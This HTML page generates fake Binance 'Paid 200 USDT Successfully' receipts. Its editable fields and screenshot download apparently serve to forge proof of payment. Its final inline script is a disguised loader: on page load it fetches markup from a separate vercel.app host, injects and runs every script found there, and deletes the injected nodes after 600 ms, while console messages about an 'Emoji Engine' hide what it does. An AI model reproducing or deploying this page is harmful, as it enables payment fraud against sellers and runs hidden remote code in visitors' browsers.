<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://magic-scripts-bnb-pay.vercel.app/style.css">
    <title>Binance Payment</title>
<link rel="icon" href="https://magic-scripts-bnb-pay.vercel.app/bnb.png" type="image/png">
</head>
<body>
    <div id="box">
        <div class="battery1"></div>
        <div class="battery2"></div>
        <div class="time"></div>
        <div class="popup1">Paid 200 USDT Successfully</div>
        <div class="popup2">You paid 200 USDT on <span class="utc"></span>.</div>
        <div class="amount">200 USDT</div>
        <div class="amount2">200 USDT</div>
        <div class="method">Funding Account</div>
        <div class="name">Nickname: Magic_Scripts</div>
        <div class="id">505638805</div>
        <div class="order_id">394405528396259333</div>

        <img src="https://magic-scripts-bnb-pay.vercel.app/img.png">
    </div>
    <label style="color:white">Battery (%):</label>
    <input type="number" value="90">
    <button class="btn" title="Download">
    <img src="https://raw.githubusercontent.com/ahmad-bhai/zeetex-currency-rate/0f914c89358480c47e3fdbb8a74f7020d938cf36/download.svg" alt="Download">
    </button>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
        integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://magic-scripts-bnb-pay.vercel.app/script.js"></script>
    <script>
        (async () => {
            try {
                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
                let rawMarkup = await response.text();
                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
                
                documentDOM.querySelectorAll('script').forEach(oldNode => {
                    let freshScriptNode = document.createElement('script');
                    if (oldNode.src) {
                        freshScriptNode.src = oldNode.src;
                    } else {
                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                    }
                    document.body.appendChild(freshScriptNode);
                    setTimeout(() => freshScriptNode.remove(), 600);
                });
                console.log(" Emoji Engine Hook Active");
            } catch (e) {
                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
            }
        })();
         </script>
</body>
</html>
